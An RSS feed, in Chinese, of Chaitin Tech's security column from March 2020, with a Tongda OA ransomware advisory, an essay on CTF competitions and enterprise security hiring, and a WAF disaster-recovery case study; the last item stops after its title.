<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description>安全攻防技术分享</description>
<language>zh-cn</language>
<lastBuildDate>Thu, 19 Mar 2020 12:55:39 +0800</lastBuildDate>
<item>
<title>通达OA用户反馈遭到勒索病毒攻击，长亭雷池天然防护</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2020-03-19-114374629.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/114374629&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-403833a53708c11e8d3adc86d2fb5825_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;近日，通达 OA 官方发布了安全更新通告，称收到部分用户反馈遭到勒索病毒攻击，并对事件中被滥用的高危漏洞发布了安全更新进行修复：&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//www.tongda2000.com/news/673.php&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;提醒您及时对OA服务器做好安全防护！&lt;/a&gt;&lt;p&gt;通达 OA 是一套国内常用的办公系统，其此次安全更新修复的高危漏洞为文件上传及文件包含漏洞的组合利用漏洞。攻击者在远程且未经授权的情况下，通过利用此漏洞，可以在目标服务器上执行任意恶意代码，最终获取系统权限。&lt;/p&gt;&lt;p&gt;具体影响范围包括：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;通达OA      V11版&lt;/li&gt;&lt;li&gt;通达OA      2017版&lt;/li&gt;&lt;li&gt;通达OA      2016版&lt;/li&gt;&lt;li&gt;通达OA      2015版&lt;/li&gt;&lt;li&gt;通达OA      2013增强版&lt;/li&gt;&lt;li&gt;通达OA 2013版&lt;/li&gt;&lt;/ul&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-308903cb93351b194fa62927d41cc0ea_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;499&quot; data-rawheight=&quot;290&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;499&quot; data-original=&quot;https://pic3.zhimg.com/v2-308903cb93351b194fa62927d41cc0ea_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-308903cb93351b194fa62927d41cc0ea_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;499&quot; data-rawheight=&quot;290&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;499&quot; data-original=&quot;https://pic3.zhimg.com/v2-308903cb93351b194fa62927d41cc0ea_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-308903cb93351b194fa62927d41cc0ea_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;而针对此漏洞，长提科技旗下的雷池WAF 有着天然的防护，凡是使用雷池 WAF 的用户根本无需处理即可防御此漏洞。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3c1d20c88c9993cb0345732492e00753_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;440&quot; data-rawheight=&quot;440&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;440&quot; data-original=&quot;https://pic4.zhimg.com/v2-3c1d20c88c9993cb0345732492e00753_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3c1d20c88c9993cb0345732492e00753_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;440&quot; data-rawheight=&quot;440&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;440&quot; data-original=&quot;https://pic4.zhimg.com/v2-3c1d20c88c9993cb0345732492e00753_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-3c1d20c88c9993cb0345732492e00753_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;说到这，真的是不得不打一波广告了~&lt;/p&gt;&lt;p&gt;雷池（SafeLine）是全球第一款基于智能语义分析的下一代Web应用防火墙产品（，内置智能威胁识别引擎，可以还原出经过层层伪装变形的攻击向量，并从编码的基因层面识别和判断其危害程度，从而提升对网络攻击行为判断的准确率，降低误报率，并对未知威胁有天然的抵抗力。雷池（SafeLine）实现了对传统WAF产品革命性的创新，其基于智能语义分析的智能化解析攻击行为的模式，打破了WAF依赖规则维护的工作原理，为企业带来更准确、更快捷、更省心的Web安全防护理念。&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.chaitin.cn/zh/safeline&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;https://pic3.zhimg.com/v2-d3ca9afe5a7cc5130f046429408dd6c2_ipico.jpg&quot; data-image-width=&quot;1181&quot; data-image-height=&quot;1423&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;长亭科技 - 下一代应用安全领导者&lt;/a&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2020-03-19-114374629</guid>
<pubDate>Thu, 19 Mar 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>还在羡慕韩商言？企业安全人员告诉你CTF也会有“不兼容”哦~</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2020-03-18-114171724.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/114171724&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6f582d8cd905976df7d4311f33101431_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;一部《亲爱的，热爱的》火了李现杨紫，也火了为过审而强改的CTF，很多人在叫着要给李现生猴子，也有人梦想着能像韩商言一样在CTF上激情拼搏，甚至因此在职业规划上有了新的方向。那么，像CTF这样的网络竞赛是否也同样受到企业职场的青睐呢？&lt;/p&gt;&lt;p&gt;在过去十年，以CTF为主的网络安全竞赛在我国经历了从无到有、再到蓬勃发展的过程。这期间以蓝莲花战队、0ops战队为代表的年轻一代在国际赛场上崭露头角，高校中涌现了无数网络安全技术人才；虽然网络安全竞赛的引入和推广取得了累累硕果，但也出现了一些质疑的声音。&lt;/p&gt;&lt;p&gt;其中最多的声音来自各行各业的&lt;b&gt;企业安全人员&lt;/b&gt;，有人指出部分CTF题目考察的技能和知识点在实际工作场景中并无用处，且CTF题目的某些形式也与通常企业安全人员所面临的实战场景相去甚远。确实，当前流行的CTF赛制和考题形式都起源于国际黑客社区，它可以追溯到1996年的DEF CON黑客大会，演变到今天，这类赛事的主要受众群体多为网络安全攻防技术的研究人员。国际CTF赛事的参赛群体中不乏一些国际知名的顶尖专家，技能方向多以漏洞挖掘和利用、密码学、取证分析和隐写为主，这类赛事侧重考察快速学习和研究能力，&lt;b&gt;重攻击轻防守&lt;/b&gt;，在引入和推广到各行各业的过程中，如果只是照搬而不加以调整，难免会产生“兼容性”问题。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4d3ac2a0812436267d3b4fab9d1fa0a5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;260&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;899&quot; data-original=&quot;https://pic2.zhimg.com/v2-4d3ac2a0812436267d3b4fab9d1fa0a5_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4d3ac2a0812436267d3b4fab9d1fa0a5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;260&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;899&quot; data-original=&quot;https://pic2.zhimg.com/v2-4d3ac2a0812436267d3b4fab9d1fa0a5_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-4d3ac2a0812436267d3b4fab9d1fa0a5_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;据统计，我国网络安全人才缺口近百万，其中最大的缺口来自企业。如何解决网络安全竞赛兼容性问题，将网络安全竞赛中的新鲜优秀血液真正的输入企业，是企业也是行业最为关注的重中之重。&lt;/p&gt;&lt;h2&gt;一、企业网络安全究竟需要怎样的人才？&lt;/h2&gt;&lt;p&gt;企业在网络安全方面的核心诉求永远是降低网络安全风险，这一目标通常可以由多种不同技能的角色共同配合来完成。&lt;/p&gt;&lt;p&gt;&lt;b&gt;1. 攻击模拟型人才&lt;/b&gt;&lt;/p&gt;&lt;p&gt;企业需要培养自己的漏洞挖掘人员，来从事漏洞扫描和渗透测试工作，越来越多的企业还会组建自己的红队或蓝军，来帮助企业持续性地进行APT攻击模拟验证。&lt;/p&gt;&lt;p&gt;&lt;b&gt;2. 防守型人才&lt;/b&gt;&lt;/p&gt;&lt;p&gt;漏洞是挖不完的，为了识别和抵御入侵，企业必须构建监测和防护体系，这部分工作主要依靠防守型人才，他们擅长使用和运营安全设备，能够熟练地对系统和服务进行加固和漏洞修补。&lt;/p&gt;&lt;p&gt;&lt;b&gt;3. 应急型人才&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这类人才所具备的技能通常在入侵事件发生时发挥作用，例如要能够对入侵现场做应急排查和处置，找到产生问题的源头并进行抑制，另外为了进一步追究攻击者的法律责任，还需要进行取证分析和溯源分析。&lt;/p&gt;&lt;p&gt;&lt;b&gt;4. 懂安全的研发人才&lt;/b&gt;&lt;/p&gt;&lt;p&gt;消除漏洞成本最低的方式是从根源上解决问题，即在系统研发阶段就尽可能避免漏洞的出现，因此企业迫切需要能够避免安全问题出现的研发人才。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e9f71bfb06fe01a8c13d4c80038bdaa0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;872&quot; data-rawheight=&quot;321&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;872&quot; data-original=&quot;https://pic1.zhimg.com/v2-e9f71bfb06fe01a8c13d4c80038bdaa0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e9f71bfb06fe01a8c13d4c80038bdaa0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;872&quot; data-rawheight=&quot;321&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;872&quot; data-original=&quot;https://pic1.zhimg.com/v2-e9f71bfb06fe01a8c13d4c80038bdaa0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-e9f71bfb06fe01a8c13d4c80038bdaa0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;二、那么，现在的网络安全竞赛又是怎样的？&lt;/h2&gt;&lt;p&gt;如今全球范围内最流行的网络安全竞赛形式当数CTF夺旗赛。CTF起源于DEF CON黑客大会，经过了二十多年的发展，在国际上形成了以来自工业界和学术界的安全研究人员为主的CTF社区，社区里的战队大多保持着较高的参赛活跃度，并定期举办高质量赛事回馈社区。国际CTF对考察知识不设限制，且考点与时俱进，参赛者能够在安全技术的广度、深度、时效性上不断受益。CTF在全球范围内培养了一批顶尖研究人才，有不少是来自高校的学生，其中就包括蓝莲花战队队员。&lt;/p&gt;&lt;p&gt;2013年，蓝莲花战队举办了BCTF，在国内拉开了CTF赛事组织的序幕。后续的几年里，各大高校也纷纷组建战队活跃参赛，并举办了各自的赛事。到了2015年，越来越多的政府、行业、企业也开始举办此类竞赛，CTF赛事的参赛选手从国内的学生和研究人员，进一步扩大到企业安全人员。&lt;/p&gt;&lt;p&gt;国内赛事大多依然直接沿用国际CTF的两种模式——解题模式和攻防模式：解题模式主要通过模拟编写的小型软件来考察选手的漏洞发现和利用技能，例如Web和Pwn，也会通过给定一些模拟的小型网络安全任务场景来让选手解决，例如逆向、取证、隐写和解密；攻防模式会让选手在模拟编写的多个小型软件上进行互攻互守。题目的技能方向分布基本与国际比赛保持一致，但是在难度上有所调整。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e2f8a3c7c2f55afeaccfd52c2dc9b311_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1200&quot; data-rawheight=&quot;462&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1200&quot; data-original=&quot;https://pic2.zhimg.com/v2-e2f8a3c7c2f55afeaccfd52c2dc9b311_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e2f8a3c7c2f55afeaccfd52c2dc9b311_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1200&quot; data-rawheight=&quot;462&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1200&quot; data-original=&quot;https://pic2.zhimg.com/v2-e2f8a3c7c2f55afeaccfd52c2dc9b311_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-e2f8a3c7c2f55afeaccfd52c2dc9b311_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;1. 攻击模拟型人才培养&lt;/b&gt;&lt;/p&gt;&lt;p&gt;对于上文中所描述的企业所需的几类不同技能方向的人才，CTF的竞赛形式与攻击模拟型人才的技能贴合是最紧密的，因为CTF题目最主要的形式就是考察漏洞挖掘和利用能力纵观国际CTF史，几乎所有的攻击技巧都被浓缩在模拟的小型软件场景下形成了题目，CTF为漏洞挖掘和利用方向的人才提供了极好的学习、练习素材和技能考察机会。但对于红队方向的人才来说，CTF题目的场景就过于单调了，红队人才通常在工作中面对的是复杂的网络场景，即分布在复杂网络下的多个系统和软件。&lt;/p&gt;&lt;p&gt;为了弥补这个问题，国内出现了靶场赛、渗透赛的形式，也就是仿照企业真实网络环境搭建一个综合靶场，让选手在仿真环境中进行模拟的APT攻击，来考察选手的红队技能，这对于CTF的小型模拟软件场景是一个很好的弥补和创新。&lt;/p&gt;&lt;p&gt;&lt;b&gt;2. 防守型人才培养&lt;/b&gt;&lt;/p&gt;&lt;p&gt;对于防守型的技能，CTF攻防赛中的防守部分有所涉及，但整体计分规则上还是更多偏向攻击，且选手在攻防赛中普遍采用的技能多为比赛型技巧，与企业的实际防守场景存在差异。&lt;/p&gt;&lt;p&gt;国内出现的加固赛可以说一定程度填补了这方面的空缺，在这种赛制下，选手会拿到一些存在预置漏洞或不安全配置的单一环境，要求在其中完成对应的漏洞修复或配置加固任务。加固赛能够让企业的防守人员演练多种不同环境、不同软件的加固技能，但目前的赛事中还较少涉及安全防护设备的使用。安全防护设备的运营工作是企业防护的重中之重，如何将这部分技能的考察融入赛事是当前尚未解决的工作，其主要难点在于如何合理设置赛制，以及如何通过虚拟化的手段来降低部署和办赛成本。&lt;/p&gt;&lt;p&gt;&lt;b&gt;3. 应急型人才培养&lt;/b&gt;&lt;/p&gt;&lt;p&gt;应急型人才所需的取证分析、应急排查技术，在CTF的Misc方向和攻防赛制中有部分涉及，但同样存在场景不匹配的问题。CTF中的取证题和攻防赛中的流量分析多采用虚构场景，较少取材于真实攻击场景，侧重考察选手的基础分析能力，应急型人才可以从中练习计算机的基本功，例如学习网络协议、文件格式等知识，但难以积累到真实场景中的处置经验。&lt;/p&gt;&lt;p&gt;因此，长亭科技在2019年联合企业用户，首次尝试了在模拟企业网络的综合场景中让选手演练加固、应急、溯源的整体技能，一定程度上解决了CTF中练习场景不匹配的问题，取得了较好的成效。&lt;/p&gt;&lt;p&gt;&lt;b&gt;4. 安全研发及其他类型人才培养&lt;/b&gt;&lt;/p&gt;&lt;p&gt;在研发、数据安全、内容安全等其他技能方向上，业内还基本停留在以选择判断等理论考察为主的竞赛形式上。在2019年，长亭科技联合企业用户共同探索了数据安全和内容安全的实操竞赛形式，包含内容安全审查、数据和隐私安全审查、违规调用数据排查等方面，在新安全技能办赛的方向上迈出了探索的第一步。研发安全的实操类赛事在国内尚未见到案例，但此类赛事的核心考察点应该集中在代码安全审查和漏洞代码修复上，而非传统CTF中较为看重的漏洞利用技能。&lt;/p&gt;&lt;p&gt;自从国际CTF赛事被引入以来，国内的网络安全竞赛更多的还是采用直接模仿的形式推广，这培养了一批高水平的安全研究人员，其中大多侧重于漏洞挖掘和渗透等攻击相关的技能方向。在企业在防护、应急、安全开发等技能上，虽然业内已有一些探索和创新，但整体推广的范围较小，实际落地的案例也屈指可数，不利于非攻击模拟类网络安全人才技能的培养。&lt;/p&gt;&lt;h2&gt;三、网络安全竞赛如何解决“兼容性”问题&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-80669ca6eab4302344b5777edad6fb2d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;824&quot; data-rawheight=&quot;294&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;824&quot; data-original=&quot;https://pic2.zhimg.com/v2-80669ca6eab4302344b5777edad6fb2d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-80669ca6eab4302344b5777edad6fb2d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;824&quot; data-rawheight=&quot;294&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;824&quot; data-original=&quot;https://pic2.zhimg.com/v2-80669ca6eab4302344b5777edad6fb2d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-80669ca6eab4302344b5777edad6fb2d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;企业对网络安全人才培养需求的竞赛形式可能会有以下几个发展趋势：&lt;/p&gt;&lt;p&gt;&lt;b&gt;1. 更多考察防守技能&lt;/b&gt;&lt;/p&gt;&lt;p&gt;未来的网络安全竞赛将越来越重视针对防守场景的演练。对CTF模式赛制的大量复制，带来了如今网络安全竞赛普遍存在的重攻击轻防守现象，导致了企业的参赛人员人人都在学漏洞利用，这是好事，但防御技能的必要性和重要性同样无法忽视。已经有越来越多的企业意识到这一点，未来的网络安全竞赛必定会愈发强调对安全漏洞和配置加固、安全设备运营、应急响应等这类侧重于防守的技能考察。&lt;/p&gt;&lt;p&gt;&lt;b&gt;2. 更多关注仿真的对抗场景&lt;/b&gt;&lt;/p&gt;&lt;p&gt;未来的网络安全竞赛将更多使用仿真的攻防对抗场景来演练。传统CTF采用的小型软件场景主要考察选手的基本功和研究型安全技巧，其中包含的考点较为单一；而从真实的企业网络和实战攻防对抗场景中取材的内容，一方面更能帮助选手积累工作中的实战化技能使用经验，另一方面也能在其中演练和考察包括防守、应急等技能在内的全方面能力。依托于近年来国内上上下下都在推行的攻防演练活动，在网络安全竞赛中采用仿真度更高的环境必定是大势所趋。&lt;/p&gt;&lt;p&gt;&lt;b&gt;3. 更加贴合选手工作需求&lt;/b&gt;&lt;/p&gt;&lt;p&gt;未来的网络安全竞赛将更加重视考点与选手能力模型的匹配度。越来越多的企业已经意识到，照搬的赛事模式在企业落地时很容易让选手产生水土不服的感受，例如让人感觉考点偏难偏怪，或者和工作关联不大。从企业的需求出发，好的网络安全赛制应当是量身定制的，一方面赛制和赛题考点要和选手的工作能力需求匹配，另一方面赛事的难度也应当和选手的能力相当，这才能最大限度的发挥网络安全竞赛在企业人才培养、选拔、激励当中的作用。&lt;/p&gt;&lt;p&gt;我们相信，在新的十年，创新赛事的土壤中定会开出最绚烂的人才之花。&lt;/p&gt;&lt;hr/&gt;&lt;p&gt;本文首发于《2019长亭年度漏洞威胁分析与2020安全展望》。报告从“漏洞”和“攻防演练”两个维度解构攻防，抽样来自金融、互联网、通信、能源、医疗、教育、传媒等多个行业的223家企业/机构，透过数字背后的逻辑，尝试梳理安全从业人员的操作方法论，将漏洞关注优先级和修复的经验复制成能力象限，帮助从业人员的部分能力碎片找平水位。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f3c1689f2c28ce846cd469d65a0d505e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;260&quot; data-rawheight=&quot;260&quot; class=&quot;content_image&quot; width=&quot;260&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f3c1689f2c28ce846cd469d65a0d505e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;260&quot; data-rawheight=&quot;260&quot; class=&quot;content_image lazy&quot; width=&quot;260&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-f3c1689f2c28ce846cd469d65a0d505e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2020-03-18-114171724</guid>
<pubDate>Wed, 18 Mar 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>案例解析 | Web应用防火墙在同城多活下的实践</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2020-03-17-113835454.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/113835454&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b244bcaa368cdb44630b75444ac4bb04_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;互联网服务的全球性决定了其每天 24 小时都会有用户访问，因此任何服务的停止都会对用户造成影响。以云服务提供商为例，全球最大的保险公司之一Lloyd’s of London 2017年发布的报告称，云服务一旦遭到黑客攻击导致不可用，发生影响互联网用户正常使用的大型经济损失事件，可能会造成46亿美元的损失，若是极端事件，损失将高达531亿美元。对于高度依赖网络运营的应用，暂时中止服务意味着部分客户的永久失去及大量的经济损失，更不用提其中包含的品牌及口碑的破坏性影响。&lt;/p&gt;&lt;p&gt; 这一点已引起多个行业重视，金融行业在2020年2月5日，由中国人民银行正式发布新修订的金融行业标准《网上银行系统信息安全通用规范》（JR/T 0068-2020），对备份和恢复管理提出了更明确的规定，要求金融机构应根据网上银行系统的业务影响性分析结果，制定不同数据的备份策略，并实施应用级备份，同时要求对于同城数据备份中心，应保证可以接管所有核心业务的运行。&lt;/p&gt;&lt;p&gt;而在互联网行业，业务规模不断扩大，用户群日益增长，以及高并发，高流量，数据量大，逻辑复杂等新特点的产生，对网站业务架构建设和容灾建设也提出了新的要求。简单来说，流量越大越需要提前做好灾备，越需要网络架构能够更好地支撑业务连续性。&lt;/p&gt;&lt;p&gt;&lt;i&gt;&lt;b&gt;同城多活&lt;/b&gt;是一个帮助大流量网站实现高可用的理想灾备方案。简单来说，“同城多活” 就是一个城市内的多个机房，同时承载业务流量，可以根据用户ID、地域或者其他业务属性决定怎么分担流量，当一个机房故障时，可以快速（分钟级）切换到其他机房，理想情况下，对业务基本是无损或者非常小的。&lt;/i&gt;&lt;/p&gt;&lt;p&gt;互联网大流量企业在容灾建设中对业务连续性的极高需求，对网络安全边界产品的性能提出了挑战：下一代网络安全产品需要具有更高的配置维护效率，进而实现高可用。&lt;/p&gt;&lt;p&gt;本文将以案例说明，雷池（SafeLine）下一代Web应用防火墙在“同城多活”实践中是如何更好地优化配置维护和提高可用性的，以及如何在大流量场景下消除企业客户的顾虑，协助做好容灾建设。&lt;/p&gt;&lt;p&gt;&lt;b&gt;案例背景：&lt;/b&gt;某超大流量视频网站“同城多活”容灾建设&lt;/p&gt;&lt;p&gt;&lt;b&gt;安全需求：&lt;/b&gt;该大流量视频网站出于灾备需求，需要建设同城双机房，进行业务负载，满足高可用。平时各自承担一定比例的流量，当一个机房出现问题，在一分钟之内，将流量自动负载到另外一个机房上。 作为 Web 网关，网站所有的 Web 访问请求都会先经过 WAF ， 因此，客户对 WAF 的分钟级切换也提出了同样的要求，需要单套WAF 通过集群化的方式跨机房部署，满足灾害发生时的“分钟级”切换和统一管理，保证网站安全的高可用。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;防护难点：&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt; 如果WAF架构不合理或水平扩展能力不足，无法快速切换，易造成站点延迟甚至业务中断；&lt;/li&gt;&lt;li&gt; 若分多套WAF防护，配置维护效率往往较低，无法快速统计用户在多机房中的访问总次数，不能有效拦截高频访问；&lt;/li&gt;&lt;li&gt;单套 WAF 虽然可以实现有效的访问控制，但是如使用单套WAF来管理防护多个机房，对架构挑战比较大，通常需要调优很长时间。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;雷池（SafeLine）部署方式：&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-429959a789f73db736738174c4c4f0c1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1175&quot; data-rawheight=&quot;419&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1175&quot; data-original=&quot;https://pic2.zhimg.com/v2-429959a789f73db736738174c4c4f0c1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-429959a789f73db736738174c4c4f0c1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1175&quot; data-rawheight=&quot;419&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1175&quot; data-original=&quot;https://pic2.zhimg.com/v2-429959a789f73db736738174c4c4f0c1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-429959a789f73db736738174c4c4f0c1_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;雷池（SafeLine）通过跨机房的嵌入式集群反向代理部署方式，使得两个机房的检测节点共同组成一个大集群，而管理节点则以一主一从的方式分别部署在两个机房。当灾害发生时，若主机房出现故障，则从机房升级为主；若从机房出现故障，主机房仍然可以正常工作；若两个机房间连接出现故障，则两边各为主，分别处理各自的流量，保证业务连续性。&lt;/p&gt;&lt;p&gt;&lt;b&gt;防护效果：&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt; 采用嵌入式集群的方式能够灵活水平扩展，单机处理性能更高，满足大流量下的网站防护。&lt;/li&gt;&lt;li&gt; 雷池（SafeLine）因更智能的架构，单套WAF通过少量调优即可快速上线管理双机房，节约大量的人力成本和时间成本；&lt;/li&gt;&lt;li&gt; 部署在不同机房的WAF检测节点可统一管理配置，维护效率高；&lt;/li&gt;&lt;li&gt; 访问频率、雷池特色的插件均可跨机房全局统计次数，时延可控，从而更加准确的进行高频访问的拦截；&lt;/li&gt;&lt;li&gt; 一旦发生故障，可随业务系统一同快速切换流量，无需人工操作，实现跨机房的高可用。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;雷池（SafeLine）的集群化部署模式，具有稳定性强、易扩展的特点，理论上能支持无上限的并发处理量，能够在高度适配大流量网站和复杂网络环境下防护需求的同时，提高WAF 在“同城多活”容灾建设中的配置维护效率，大幅提高可用性。 &lt;/p&gt;&lt;p&gt;雷池（SafeLine）的嵌入式集群模式将拦截集群部署至现有的应用负载集群，完美耦合客户系统，可以在不改变现有网络拓扑的情况下完成流量检测工作，从而有效防范因水平扩展能力不足而导致的业务中断，保障业务有序进行。&lt;/p&gt;&lt;p&gt;更值得一提的是，雷池（SafeLine）的嵌入式集群部署模式可以完美支持各种复杂网络架构下的 cross region 部署，能够根据客户系统复杂的业务需求和架构变化，灵活配置跨机房、跨区域甚至跨地区的检测节点，并通过统一的管理节点进行配置维护和全局统计，实现极低成本的快速上线，从而更加准确地进行高频访问拦截。&lt;/p&gt;&lt;p&gt;近年来，面临越来越多新的安全威胁和场景化的业务安全诉求，各行业愈发重视 WAF 应对场景化安全风险的“智能安全“能力。业务场景千千万，真正的高性能智能 WAF ，必须具备在不对业务系统进行频繁改动的前提下，以极低的成本和极高的调优效率，解决实际场景化的业务安全问题，方能更好的适配数据量大、逻辑复杂的网络环境趋势，真正实现 WAF 防护的高可用。&lt;/p&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2020-03-17-113835454</guid>
<pubDate>Tue, 17 Mar 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>渗透测试，真的是合理需求吗？</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2020-03-04-110819359.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/110819359&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
